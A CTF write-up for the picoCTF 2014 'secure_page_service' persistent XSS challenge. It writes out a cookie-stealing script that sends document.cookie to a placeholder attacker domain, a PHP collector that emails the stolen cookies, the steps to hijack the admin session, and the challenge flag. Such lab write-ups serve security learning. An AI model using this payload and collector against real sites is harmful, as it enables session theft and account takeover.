---
slug: picoctf-2014-part2
title: "picoCTF 2014 part 2: secure_page_service"
authors: csressel
#tags: []
---

secure_page_service
=================

Summary
--------------
This problem is a simple XSS challenge. Using persistent XSS in a newly created page, we can steal the admin’s cookies should they choose to visit the page. The “Report to Moderator” button says, “Report this page, and a moderator will personally review it in the next few minutes!” so it is a safe assumption that we can have an admin view our injected code.

<!--truncate-->

Recon
----------
The first thing we need is an account on the challenge's site. The home page allows anyone to register. After an account is made, two actions are available: create a page, and view a page. Attempting to view the page asked for in the problem shows it is password protected. A couple quick queries show it is not vulnerable to SQL injection; another route is necessary.

Examining the page creation by creating a couple random pages, we notice that we can report pages to be reviewed by a moderator (“Spam? Abuse? Report this page, and a moderator will personally review it in the next few minutes!”).

Furthermore, attempting to use HTML tags reveals that the input allows HTML code.

Enter XSS
---------------
We can use a persistent XSS attack to steal the cookies of whoever views the page. By injecting a script into the page, we can send the viewer’s cookies elsewhere. By setting up a php script on a free hosting script, we can redirect the sent cookies to our own email. The final step will be to report the page to moderator to cause them to view our injected page.

Once we have the admin’s cookies, we can change our cookies to theirs to view the locked page.

The Setup
---------------
First we need the two scripts.

The injected script for the page will be:
```html
<script>location.href = 'http://www.YourDomainName.com/cookiestealer.php?cookie='+document.cookie;</script>
````

And the php script at the above domain name (cookiestealer.php) will look like:
```php
<?php
$cookie = $HTTP_GET_VARS["cookie"]; mail("YourEmail@YouMailProvider.com", "Stolen Cookies", $cookie);
?>
```

For free hosting, a number of options are available. We chose to use <a href='http://www.000webhost.com/'>000webhost</a>, simply because they have a nice in-browser file manager—no need to mess around with FTP clients.

Cookie Forgery
----------------------
After setting up a page with the injected script and the php script on another server, we simply report the page to have a mod (in reality a bot) view the page.

From here, we check our email for the admin cookies. Using a plugin like <a href='https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en'>this</a> or <a href='https://addons.mozilla.org/en-us/firefox/addon/edit-cookies/'>this</a> we can quickly change our cookies to the admin's, allowing us to view the locked page, and thus, the flag:

wow\_cross\_site\_scripting\_is\_such\_web
